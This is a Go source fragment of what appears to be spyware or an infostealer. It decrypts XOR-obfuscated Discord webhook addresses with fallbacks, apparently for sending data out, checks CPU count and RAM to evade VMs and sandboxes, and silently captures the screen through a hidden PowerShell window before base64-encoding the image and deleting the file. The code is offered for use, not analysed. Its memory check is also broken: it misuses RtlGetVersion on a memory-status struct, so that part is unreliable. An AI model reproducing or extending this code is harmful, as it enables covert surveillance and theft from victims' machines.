// XOR decrypt for embedded strings (change key per build)
func xorDecrypt(enc []byte, key byte) []byte {
	dec := make([]byte, len(enc))
	for i := range enc {
		dec[i] = enc[i] ^ key
	}
	return dec
}

// Embedded encrypted webhook (XOR with your key, multiple for fallback)
var encryptedWebhooks = [][]byte{
	// Example: []byte{0x1f, 0x2a, ...} // "https://discord.com/api/webhooks/..."
}

func getWebhooks(key byte) []string {
	var hooks []string
	for _, e := range encryptedWebhooks {
		hooks = append(hooks, string(xorDecrypt(e, key)))
	}
	return hooks
}

// Basic VM/sandbox check (expand as needed)
func isVMOrSandbox() bool {
	// Low proc count, low RAM, bad procs, etc.
	if runtime.NumCPU() < 4 {
		return true
	}
	memStatus := windows.MemoryStatusEx{}
	memStatus.Length = uint32(unsafe.Sizeof(memStatus))
	windows.RtlGetVersion(&memStatus) // dummy to load
	if memStatus.TotalPhys < 4*1024*1024*1024 {
		return true
	}
	// Add proc checks, registry, etc.
	return false
}

// Silent screenshot via Magick or fallback (or implement DXGI - long but silent)
func takeScreenshot() string {
	// Simple fallback using powershell (obfuscated)
	cmd := exec.Command("powershell", "-WindowStyle", "Hidden", "-Command", "Add-Type -AssemblyName System.Windows.Forms; [System.Windows.Forms.SendKeys]::SendWait('{PRTSC}'); Start-Sleep -m 500; $img = [Windows.Forms.Clipboard]::GetImage(); $path = '$env:TEMP\\ss.png'; $img.Save($path);")
	cmd.Run()
	data, _ := ioutil.ReadFile(os.Getenv("TEMP") + "\\ss.png")
	os.Remove(os.Getenv("TEMP") + "\\ss.png")
	return base64.StdEncoding.EncodeToString(data)
}

